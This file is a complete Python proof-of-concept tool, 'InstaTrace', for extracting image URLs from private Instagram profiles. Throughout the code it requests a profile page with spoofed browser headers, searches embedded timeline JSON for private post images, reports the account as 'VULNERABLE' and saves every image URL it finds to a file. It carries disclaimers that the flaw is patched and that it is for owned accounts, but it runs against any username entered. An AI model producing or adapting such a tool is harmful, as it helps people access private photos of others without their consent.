#!/usr/bin/env python3
"""
InstaTrace – Instagram Private Image URL Extractor (2025 POC)
FOR SECURITY RESEARCH / EDUCATIONAL USE ONLY
Patched by Meta in late 2025 – will NOT work on real private accounts today
"""

import requests
import json
import time
from urllib.parse import unquote
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

# Initialize colors (works on Windows too)
init(autoreset=True)

BANNER = f"""
{Fore.MAGENTA}{Style.BRIGHT}╔════════════════════════════════════════════╗
║                                            ║
║             I N S T A T R A C E            ║
║                                            ║
║   Private Profile Image URL Extractor      ║
║                       (POC)                ║
║                                            ║
╚════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.LIGHTBLACK_EX}   Use ONLY on accounts you own or have explicit permission
   This vulnerability was FIXED by Instagram/Meta{Style.RESET_ALL}
"""

C = {
    "success": Fore.GREEN + Style.BRIGHT,
    "info": Fore.CYAN,
    "warning": Fore.YELLOW + Style.BRIGHT,
    "error": Fore.RED + Style.BRIGHT,
    "dim": Fore.LIGHTBLACK_EX,
}


def print_status(msg: str, color: str = "info") -> None:
    colors = {"success": C["success"], "info": C["info"], "warning": C["warning"], "error": C["error"]}
    print(f"{colors.get(color, C['info'])}➜ {msg}{Style.RESET_ALL}")


def fetch_profile(username: str) -> requests.Response | None:
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'upgrade-insecure-requests': '1',
    }

    url = f"https://www.instagram.com/{username}/"
    print_status(f"Checking @{username}", "info")

    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code != 200:
            print_status(f"HTTP {r.status_code} – likely blocked or invalid", "error")
            return None
        return r
    except Exception as e:
        print_status(f"Connection error: {e}", "error")
        return None


def decode_url(escaped: str) -> str:
    try:
        return unquote(escaped.encode('utf-8').decode('unicode_escape'))
    except:
        return escaped


def collect_image_urls(data, urls=None, post_id=None):
    if urls is None:
        urls = set()

    if isinstance(data, dict):
        if "pk" in data:
            post_id = str(data.get("pk", "unknown"))

        if "image_versions2" in data and "candidates" in data["image_versions2"]:
            for cand in data["image_versions2"]["candidates"]:
                url = cand.get("url")
                if url:
                    w = cand.get("width", "?")
                    h = cand.get("height", "?")
                    res = f"{w}×{h}"
                    urls.add((post_id, res, decode_url(url)))

        for v in data.values():
            collect_image_urls(v, urls, post_id)

    elif isinstance(data, list):
        for item in data:
            collect_image_urls(item, urls, post_id)

    return urls


def save_results(urls: set, username: str):
    if not urls:
        return

    filename = f"{username}_urls.txt"
    by_post = {}
    for pid, res, url in urls:
        if pid not in by_post:
            by_post[pid] = []
        by_post[pid].append((res, url))

    with open(filename, "w", encoding="utf-8") as f:
        f.write(f"InstaTrace – @{username} – {len(urls)} image URLs\n")
        f.write("=" * 60 + "\n\n")
        f.write(f"Posts: {len(by_post)}    Images/variants: {len(urls)}\n\n")

        for pid in sorted(by_post):
            imgs = by_post[pid]
            f.write(f"Post {pid}\n")
            f.write(f"  {len(imgs)} variants\n")
            f.write("-" * 50 + "\n")
            for i, (res, url) in enumerate(imgs, 1):
                f.write(f"  {i:2}. {res:>10}   {url}\n")
            f.write("\n")

    print_status(f"Results saved → {filename}", "success")


def main():
    print(BANNER)

    username = input(f"{C['info']}Enter username (without @): {Style.RESET_ALL}").strip()

    if not username:
        print_status("Username required", "error")
        return

    print()
    print_status("ONLY TEST ACCOUNTS YOU OWN OR HAVE PERMISSION FOR", "warning")
    print()

    time.sleep(0.8)

    resp = fetch_profile(username)
    if not resp:
        return

    soup = BeautifulSoup(resp.text, "html.parser")
    scripts = soup.find_all("script", {"type": "application/json"})

    timeline_data = None
    for script in scripts:
        text = script.string or ""
        if "polaris_timeline_connection" in text and "image_versions2" in text:
            try:
                timeline_data = json.loads(text)
                break
            except:
                continue

    print()
    if timeline_data:
        print(f"{Fore.GREEN}{Style.BRIGHT}VULNERABLE – Private timeline data exposed!{Style.RESET_ALL}")
        print_status("Collecting image URLs...", "info")
        urls = collect_image_urls(timeline_data)
        
        if urls:
            urls_sorted = sorted(urls)
            post_count = len(set(p[0] for p in urls_sorted))
            print(f"{C['success']}Found {len(urls)} image variants from ~{post_count} posts{C['dim']}")
            
            # Show a few samples
            print(f"\n{C['dim']}First few:{Style.RESET_ALL}")
            for i, (pid, res, url) in enumerate(urls_sorted[:4], 1):
                # print(f"  {i}. {pid} | {res} | {url[:68]}{'...' if len(url)>68 else ''}")
                print(f"  {i}. {pid} | {res} | {url}")
            
            save_results(urls, username)
        else:
            print_status("No images extracted (strange – data was found)", "warning")
    else:
        print(f"{Fore.RED}{Style.BRIGHT}NOT VULNERABLE – No private data exposed{Style.RESET_ALL}")
        print_status("Account is likely empty, or the bug is patched", "dim")

    print()
    print_status("Done.", "success")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C['warning']}Stopped.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{C['error']}Error: {e}{Style.RESET_ALL}")